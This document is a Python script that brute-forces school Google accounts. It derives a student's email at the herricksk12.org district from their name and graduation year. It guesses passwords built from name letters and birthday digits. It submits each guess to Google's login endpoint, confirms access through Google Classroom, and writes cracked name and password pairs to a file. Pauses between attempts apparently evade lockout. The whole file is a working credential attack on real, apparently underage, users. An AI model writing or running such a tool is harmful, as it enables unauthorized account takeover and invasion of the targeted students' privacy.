from bs4 import BeautifulSoup
import requests
import time
import sys


class SessionGoogle:
    def __init__(self, url_login, url_auth, login, pwd):
        self.ses = requests.session()
        login_html = self.ses.get(url_login)
        soup_login = BeautifulSoup(login_html.content, 'lxml').find('form').find_all('input')
        my_dict = {}
        for u in soup_login:
            if u.has_attr('value'):
                my_dict[u['name']] = u['value']
        my_dict['Email'] = login
        my_dict['Passwd'] = pwd
        self.ses.post(url_auth, data=my_dict)

    def get(self, URL):
        return self.ses.get(URL).text


url_login = "https://accounts.google.com/ServiceLogin"
url_auth = "https://accounts.google.com/ServiceLoginAuth"

first, last = map(lambda x: x.lower(), input('Name: ').split())
full_name = first.capitalize() + ' ' + last.capitalize()
year = int(input('Year of Anticipated Graduation: ')[-2:])
email = first[:2]+last[:4]+f'{year}@herricksk12.org'

#Generate Password List

bMon, bDay = map(lambda x: int(x), input('Birthday MM/DD: ').split('/'))

passwordList = [first[:2].upper() + last[:2] + str(bMon) + str(bDay) + str(x) + str(y)
                for x in range(0,10)
                for y in range(0,10)]

#For flavor :)

backward = input('Backwards? (y/n): ')[0].lower()
if backward == 'y':
    passwordList = passwordList[::-1]

print()
print(email)
print('Initiating BruteForce...')

#Loop through passwords

for passwords in passwordList:
    try:
        session = SessionGoogle(url_login, url_auth, email, passwords)
        corr = str(session.get('http://classroom.google.com'))
        print(passwords+'\n')
        if email in corr:
            print('Access Granted')
            print(passwords)
            with open('HPA.txt', 'a') as f:
                f.write(full_name+'\n')
                f.write(passwords+'\n\n')
            print(input())
            sys.exit('Done')
        else:
            print('Failed\n')
            
        time.sleep(600)
    except:
        print('Error\n')
        time.sleep(10)

with open('Failed.txt', 'a') as f:
    f.write(full_name+'\n')
